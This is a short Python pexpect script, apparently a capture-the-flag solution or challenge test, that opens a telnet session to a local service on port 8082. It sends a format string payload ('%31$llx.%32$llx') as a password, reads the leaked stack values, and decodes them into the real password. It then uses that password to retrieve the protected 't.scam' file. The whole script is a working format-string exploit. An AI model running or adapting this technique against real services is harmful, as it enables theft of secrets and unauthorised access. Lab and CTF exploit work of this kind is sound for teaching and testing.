import re

import pexpect

# Start the telnet session
child = pexpect.spawn('telnet localhost 8082')

# Expect the initial prompt from the telnet server
child.expect(r'.*\$ '.encode())

# Send the command that triggers the password request
child.sendline('plunder t.scam')

# Handle the output and wait for the password prompt
child.expect(r'.*\: '.encode())
# Send the format string exploit as the password
child.sendline('%31$llx.%32$llx')

# Now, wait for the incorrect password message which includes the pattern "is incorrect!"
incorrect_message_pattern = re.compile(rb'(\w+)\.(\w+).*')

# Read the buffer to get the incorrect password message
child.expect(incorrect_message_pattern)

# The output captured will include the incorrect message
incorrect_message = child.match.group(0).decode()
print(f"Incorrect message: {incorrect_message}")  # Debug print to verify output

# Extract the two addresses from the captured groups
address1_hex = child.match.group(1).decode()
address2_hex = child.match.group(2).decode()
print(f'Address 1 Hex: {address1_hex}')  # Debug print to verify address 1 hex
print(f'Address 2 Hex: {address2_hex}')  # Debug print to verify address 2 hex

# These addresses are in little-endian format, so we need to reverse them and convert to ASCII to get the password
# CONSIDER: Using password that is not in ASCII format for the challenge?? Piping might be necessary then?

# Convert the addresses to ASCII and reverse them
address1 = bytes.fromhex(address1_hex).decode()[::-1]
address2 = bytes.fromhex(address2_hex).decode()[::-1]

# Print the password
print(f'Password: {address1}{address2}')

# Now try to plunder the file again
child.expect(r'.*\$ '.encode())
child.sendline('plunder t.scam')
child.expect(r'.*\: '.encode())
child.sendline(f'{address1}{address2}')

# Wait for the output and print it
child.expect(r'.*\$ '.encode())
print(child.before.decode())
